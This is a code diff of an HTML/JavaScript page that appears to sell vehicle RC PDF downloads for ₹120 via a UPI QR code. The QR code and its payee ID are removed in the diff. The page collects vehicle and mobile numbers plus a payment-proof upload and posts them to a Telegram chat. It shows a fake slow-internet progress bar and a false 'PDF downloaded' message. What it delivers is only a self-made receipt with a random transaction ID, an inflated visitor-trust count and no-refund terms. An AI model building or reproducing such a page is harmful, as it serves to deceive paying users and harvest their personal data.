@@ -9,8 +9,6 @@
 
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:Segoe UI}
-
-/* RGB BG */
 body{
 background:linear-gradient(-45deg,#ff0066,#005BAC,#00c6ff,#00ff99);
 background-size:400% 400%;
@@ -22,8 +20,6 @@ display:flex;flex-direction:column;align-items:center;
 50%{background-position:100%}
 100%{background-position:0%}
 }
-
-/* TOPBAR */
 .topbar{
 position:fixed;top:0;width:100%;
 background:#fff;padding:10px 20px;
@@ -31,7 +27,6 @@ display:flex;justify-content:flex-end;
 }
 .homeBtn{background:#ff0066;color:#fff;padding:8px;border-radius:8px;margin-right:10px}
 
-/* MENU */
 .menu-icon div{
 width:25px;height:3px;background:#ff0066;margin:5px 0;
 }
@@ -45,7 +40,6 @@ background:#ff0066;color:#fff;border-radius:8px;
 }
 .openMenu{right:0}
 
-/* CARD */
 .card{
 margin-top:110px;
 background:rgba(255,255,255,0.2);
@@ -63,17 +57,13 @@ box-shadow:0 5px 0 #333;
 }
 button:active{transform:translateY(3px);box-shadow:0 2px 0 #333}
 
-.qr{width:180px;margin-top:10px}
 .hidden{display:none}
 
 /* LOADER */
 .loader{
 position:fixed;top:0;left:0;width:100%;height:100%;
-background:#fff;
-display:none;
-flex-direction:column;
-justify-content:center;
-align-items:center;
+background:#fff;display:none;
+flex-direction:column;justify-content:center;align-items:center;
 }
 .barBox{width:80%;background:#ddd;border-radius:10px}
 .bar{width:0%;height:20px;background:#ff0066}
@@ -100,15 +90,14 @@ display:none;text-align:center;
 
 <div class="sideMenu" id="menu">
 <button onclick="openInsurance()">Insurance</button>
-<button onclick="alert('About Page')">About</button>
-<button onclick="alert('Disclaimer')">Disclaimer</button>
+<button>About</button>
+<button>Disclaimer</button>
 <button onclick="window.location.href='https://t.me/yourtelegramusername'">Contact</button>
 </div>
 
 <div id="visitorCount" style="color:#fff;margin-top:70px;font-weight:bold;"></div>
 
 <div class="card">
-
 <div id="page1">
 <h2>Vehicle Number</h2>
 <input id="vehicle" oninput="formatVehicle(this)">
@@ -116,27 +105,18 @@ display:none;text-align:center;
 </div>
 
 <div id="page2" class="hidden">
-<h2>₹120 Payment</h2>
-
-<img class="qr"
-src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi%3A%2F%2Fpay%3Fpa%3D8709610091%40okbizaxis%26am%3D120%26cu%3DINR">
-
 <input id="mobile" placeholder="Mobile Number">
 <input type="file" id="proof">
-
 <button onclick="submitForm()">Submit</button>
 </div>
-
 </div>
 
-<!-- LOADER -->
 <div class="loader" id="loader">
 <div class="barBox"><div class="bar" id="bar"></div></div>
 <div class="text" id="percent">0%</div>
 <div class="text">इंटरनेट धीमा है, कृपया BACK बटन न दबाएं</div>
 </div>
 
-<!-- POPUP -->
 <div class="popup" id="popup">
 <h2>🎉 Congratulations</h2>
 <p>आपका PDF डाउनलोड हो गया है</p>
@@ -166,7 +146,6 @@ input.value=v;
 }
 
 function goNext(){
-if(!vehicle.value){alert("Enter vehicle");return;}
 page1.classList.add("hidden");
 page2.classList.remove("hidden");
 }
@@ -180,14 +159,14 @@ let txn="TXN"+Math.floor(Math.random()*999999);
 let count=localStorage.getItem("visitors");
 
 let canvas=document.createElement("canvas");
-canvas.width=600;canvas.height=900;
+canvas.width=600;canvas.height=1000;
 let ctx=canvas.getContext("2d");
 
-ctx.fillStyle="#fff";ctx.fillRect(0,0,600,900);
+ctx.fillStyle="#fff";ctx.fillRect(0,0,600,1000);
 
 /* BORDER */
-ctx.lineWidth=6;ctx.strokeRect(5,5,590,890);
-ctx.lineWidth=2;ctx.strokeRect(15,15,570,870);
+ctx.lineWidth=6;ctx.strokeRect(5,5,590,990);
+ctx.lineWidth=2;ctx.strokeRect(15,15,570,970);
 
 /* HEADER */
 ctx.fillStyle="#005BAC";ctx.fillRect(5,5,590,70);
@@ -195,25 +174,28 @@ ctx.fillStyle="#fff";ctx.font="italic bold 26px Arial";
 ctx.textAlign="center";ctx.fillText("RCPDF.IN",300,45);
 
 /* BOX */
-ctx.strokeRect(40,120,520,230);
+ctx.strokeRect(40,120,520,250);
 
 ctx.textAlign="left";ctx.font="16px Arial";
 ctx.fillText("Vehicle: "+v,60,160);
 ctx.fillText("Mobile: "+m,60,190);
-ctx.fillText("Transaction ID: "+txn,60,220);
-ctx.fillText("Date: "+d.toLocaleDateString(),60,250);
-ctx.fillText("Time: "+d.toLocaleTimeString(),60,280);
-ctx.fillText("Trusted by "+count+" visitors",60,310);
+ctx.fillText("Work: RC Download",60,220);
+ctx.fillText("Transaction ID: "+txn,60,250);
+ctx.fillText("Date: "+d.toLocaleDateString(),60,280);
+ctx.fillText("Time: "+d.toLocaleTimeString(),60,310);
+ctx.fillText("Trusted by "+count+" visitors",60,340);
 
-/* TERMS */
-ctx.font="11px Arial";
-let y=380;
-ctx.fillText("• Yeh website RTO se judi nahi hai",40,y); y+=22;
-ctx.fillText("• Jaankari ki guarantee nahi hai",40,y); y+=22;
-ctx.fillText("• Sirf information purpose ke liye hai",40,y); y+=22;
-ctx.fillText("• Galat use ki jimmedari user ki hogi",40,y); y+=22;
-ctx.fillText("• Payment ke baad refund nahi milega",40,y); y+=22;
-ctx.fillText("• Payment karna sharto ki sweekriti hai",40,y);
+/* TERMS FULL */
+ctx.font="12px Arial";
+let y=420;
+
+ctx.fillText("• Yeh website kisi bhi tarah se RTO se juda hua nahi hai",40,y); y+=22;
+ctx.fillText("• Hum jaankari ki puri tarah se sahi hone ki koi pusti nahi karte",40,y); y+=22;
+ctx.fillText("• Yeh site sirf jaankari purpose ke liye hai",40,y); y+=22;
+ctx.fillText("• Kisi bhi tarah ka galat istemal karne ki jimmedari user ki hogi",40,y); y+=22;
+ctx.fillText("• PDF request ke baad amount refund nahi kiya jayega",40,y); y+=22;
+ctx.fillText("• Grahak ne payment kiya hai to sabhi sharton ki jimmedari grahak ki hogi",40,y); y+=22;
+ctx.fillText("• Aapko RC ki PDF jald hi aapke diye gaye mobile number par bhej di jayegi",40,y);
 
 const { jsPDF } = window.jspdf;
 let pdf=new jsPDF();
@@ -239,7 +221,6 @@ clearInterval(interval);
 
 downloadPDF();
 
-/* TELEGRAM */
 let data=new FormData();
 data.append("chat_id","5600045707");
 data.append("caption","Vehicle: "+vehicle.value+"\nMobile: "+mobile.value);
